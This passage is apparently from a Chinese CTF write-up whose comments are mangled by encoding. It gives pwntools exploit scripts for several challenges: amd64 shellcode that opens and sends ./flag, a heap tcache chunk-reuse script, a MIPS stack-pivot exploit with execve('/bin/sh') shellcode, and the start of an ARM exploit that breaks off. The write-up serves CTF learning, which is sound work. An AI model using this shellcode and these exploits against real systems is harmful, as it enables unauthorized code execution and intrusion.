<span class="token comment"># int 0x80;</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>


<span class="token comment"># payload = shellcode</span>

<span class="token comment"># payload = payload.ljust(0x160,b&#39;\x00&#39;)</span>
<span class="token comment"># payload += b&quot;\x00\x00./flag\x00\x00\x00&quot;</span>
<span class="token comment"># print(payload)</span>
<span class="token comment"># sd(payload)</span>
<span class="token comment"># ru(b&quot;show your magic again\n&quot;)</span>
<span class="token comment"># shellcode= asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># push 0x23    </span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># )</span>
<span class="token comment"># ia()</span>
<span class="token comment"># print(len(asm(shellcode,arch=&#39;amd64&#39;)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;show your magic again\n&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># readå‡½æ•° and sendfileå‡½æ•°</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">&#39;&#39;&#39;
mov rax, 0x67616c662f2e
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
xor edx, edx
xor r10, r10
push 0x101
pop rax
syscall

mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push 0x28
pop rax
syscall

mov rax,1

&#39;&#39;&#39;</span>
<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">&quot;amd64&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;}&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="malloc-flag" tabindex="-1"><a class="header-anchor" href="#malloc-flag" aria-hidden="true">#</a> malloc_flag</h2><blockquote><p>ä¸æ‡‚ä¸ºä»€ä¹ˆè¿™é¢˜å°±åªæœ‰30å¤šè§£</p></blockquote><ul><li>è¯»å–äº†flagè€Œä¸”å†™å…¥äº†chunkä¸­å†æŠŠchunk freeäº† è¿™ä¸ªfree chunkå°±è¿›å…¥äº†tcache æˆ‘ä»¬ç›´æ¥mallocä¸€ä¸ªå¤§å°ä¸€æ ·çš„chunk ç„¶åè¾“å‡º å°±å¯ä»¥è·å–flag</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">52689</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+516&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">recv_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># è¯·è¾“å…¥åå­—:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># è¯·è¾“å…¥å¤§å° (åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶):</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">displayChunks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">displayChunk</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># è¯·è¾“å…¥è¦æŸ¥çœ‹å†…å®¹çš„å†…å­˜å—åå­—:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> displayChunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ez1-0-mips" tabindex="-1"><a class="header-anchor" href="#ez1-0-mips" aria-hidden="true">#</a> EZ1.0?(mips)</h2><blockquote><p>ç™½ç»™ ä¸€ä¸ªæ ˆè¿ç§» ç„¶ååˆ°bssç«¯æ‰§è¡Œshellcode</p></blockquote><ul><li>æœ¬åœ°bssæ²¡æœ‰å¯æ‰§è¡Œæƒé™ä½†æ˜¯è¿œç¨‹æœ‰ è¿™é¢˜åº”è¯¥éº»çƒ¦çš„æ˜¯æ­å»ºmipsç¯å¢ƒ</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;mips&#39;</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">&quot;little&quot;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>
<span class="token comment"># p = process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;12345&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu/&quot;, &quot;./mips&quot;])</span>
<span class="token comment"># pwnlib.qemu.user_path(arch=&#39;mips&#39;)</span>
<span class="token comment"># pwnlib.qemu.ld_prefix(arch=&#39;mips&#39;)</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./mips&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">50176</span>
stack_addr <span class="token operator">=</span>  <span class="token number">0x7ffff000</span>
<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b&quot;b&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x493400</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x400864</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b&quot;welcome XYCTF mips world&quot;</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x493460</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ez2-0-arm" tabindex="-1"><a class="header-anchor" href="#ez2-0-arm" aria-hidden="true">#</a> EZ2.0?(arm)</h2><blockquote><p>å’Œmipsä¸€æ¨¡ä¸€æ · æ ˆè¿ç§» ç„¶åshellcode</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span> arch<span class="token operator">=</span><span class="token string">&#39;arm&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./arm&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">57621</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b vuln&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
